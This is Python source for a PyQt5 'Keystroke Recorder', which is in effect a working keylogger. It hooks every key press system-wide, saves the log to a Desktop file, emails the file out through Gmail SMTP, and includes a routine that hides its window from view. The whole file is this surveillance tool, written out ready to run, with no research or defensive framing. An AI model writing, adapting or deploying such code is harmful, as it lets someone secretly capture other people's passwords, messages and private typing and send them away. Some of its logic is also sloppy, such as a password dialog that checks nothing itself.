import os
import keyboard
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from PyQt5.QtWidgets import QApplication, QWidget, QVBoxLayout, QHBoxLayout, QLabel, QTextEdit, QPushButton, QMessageBox, QLineEdit, QDialog, QMainWindow
from PyQt5.QtCore import Qt, QCoreApplication

class PasswordDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Password Verification")
        self.password_input = QLineEdit()
        self.password_input.setEchoMode(QLineEdit.Password)
        self.verify_button = QPushButton("Verify")
        self.verify_button.clicked.connect(self.verify_password)
        layout = QVBoxLayout()
        layout.addWidget(QLabel("Enter password to stop the program:"))
        layout.addWidget(self.password_input)
        layout.addWidget(self.verify_button)
        self.setLayout(layout)

    def verify_password(self):
        password = self.password_input.text().strip()
        self.password_input.clear()
        self.accept()

class KeystrokeRecorder(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Keystroke Recorder")
        self.recorded_keystrokes = []
        self.is_recording = False
        self.password = ""
        self.email_address = ""

        self.setup_ui()

    def setup_ui(self):
        central_widget = QWidget()
        self.setCentralWidget(central_widget)

        self.layout = QVBoxLayout()
        central_widget.setLayout(self.layout)

        self.text_label = QLabel("Press Start to begin recording keystrokes.")
        self.layout.addWidget(self.text_label)

        self.start_button = QPushButton("Start")
        self.start_button.clicked.connect(self.start_recording)
        self.layout.addWidget(self.start_button)

        self.stop_button = QPushButton("Stop")
        self.stop_button.clicked.connect(self.stop_recording)
        self.stop_button.setEnabled(False)
        self.layout.addWidget(self.stop_button)

        self.password_input = QTextEdit()
        self.password_input.setPlaceholderText("Enter password to confirm")
        self.layout.addWidget(self.password_input)

        self.email_input = QTextEdit()
        self.email_input.setPlaceholderText("Enter email address")
        self.layout.addWidget(self.email_input)

        self.set_password_button = QPushButton("Set Password")
        self.set_password_button.clicked.connect(self.set_password)
        self.layout.addWidget(self.set_password_button)

        self.set_email_button = QPushButton("Set Email")
        self.set_email_button.clicked.connect(self.set_email)
        self.layout.addWidget(self.set_email_button)

        self.hideEvent = self.hide_to_system_tray

    def set_password(self):
        self.password = self.password_input.toPlainText().strip()
        self.password_input.clear()

    def set_email(self):
        self.email_address = self.email_input.toPlainText().strip()
        self.email_input.clear()

    def start_recording(self):
        self.is_recording = True
        self.recorded_keystrokes = []
        self.password = self.password_input.toPlainText().strip()
        self.email_address = self.email_input.toPlainText().strip()

        self.text_label.setText("Recording keystrokes. Press Stop to end.")

        self.start_button.setEnabled(False)
        self.stop_button.setEnabled(True)

        keyboard.hook(self.record_keystroke)
        keyboard.add_hotkey("F5", self.confirm_stop_recording)

    def stop_recording(self):
        self.is_recording = False

        self.start_button.setEnabled(True)
        self.stop_button.setEnabled(False)

        keyboard.unhook(self.record_keystroke)
        keyboard.unhook(self.confirm_stop_recording)

        if self.password:
            self.confirm_stop_recording()

    def record_keystroke(self, event):
        if self.is_recording:
            if event.event_type == "down":
                if event.name == "space":
                    self.recorded_keystrokes.append(" ")
                else:
                    self.recorded_keystrokes.append(event.name)

    def confirm_stop_recording(self):
        dialog = PasswordDialog(self)
        if dialog.exec_() == QDialog.Accepted:
            entered_password = dialog.password_input.text().strip()
            dialog.password_input.clear()
            if entered_password == self.password:
                self.save_keystrokes_to_file()
                self.send_email_with_keystrokes()
                self.show_message_box("Recording stopped.", "Success")
                self.is_recording = False
                self.text_label.setText("Press Start to begin recording keystrokes.")
            else:
                self.show_message_box("Incorrect password. Please try again.", "Error")

    def save_keystrokes_to_file(self):
        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
        file_path = os.path.join(desktop_path, "recordedKeyStrokes.txt")

        with open(file_path, "w") as file:
            keystrokes = " ".join(self.recorded_keystrokes)
            file.write(keystrokes)

    def send_email_with_keystrokes(self):
        if not self.email_address:
            return

        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
        file_path = os.path.join(desktop_path, "recordedKeyStrokes.txt")

        msg = MIMEMultipart()
        msg["From"] = self.email_address
        msg["To"] = self.email_address
        msg["Subject"] = "Recorded Keystrokes"

        with open(file_path, "r") as file:
            attachment = MIMEText(file.read())
            attachment.add_header("Content-Disposition", "attachment", filename="recordedKeyStrokes.txt")
            msg.attach(attachment)

        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(self.email_address, self.password)
            server.sendmail(self.email_address, self.email_address, msg.as_string())
            server.quit()
        except Exception as e:
            self.show_message_box(f"Failed to send email. Error: {str(e)}", "Error")

    def show_message_box(self, message, title):
        msg_box = QMessageBox()
        msg_box.setIcon(QMessageBox.Information)
        msg_box.setWindowTitle(title)
        msg_box.setText(message)
        msg_box.exec()

    def hide_to_system_tray(self, event):
        self.setWindowFlags(Qt.Tool | Qt.FramelessWindowHint)
        self.hide()
        event.ignore()

if __name__ == "__main__":
    app = QApplication([])
    window = KeystrokeRecorder()
    window.show()
    app.exec_()
